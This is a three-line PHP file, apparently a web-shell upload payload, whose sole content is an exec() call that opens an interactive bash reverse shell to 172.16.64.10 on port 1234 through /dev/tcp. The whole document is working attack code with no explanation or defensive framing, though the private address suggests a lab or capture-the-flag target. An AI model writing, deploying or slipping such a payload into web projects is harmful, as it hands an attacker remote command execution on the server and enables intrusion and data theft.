<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/172.16.64.10/1234 0>&1'");
?>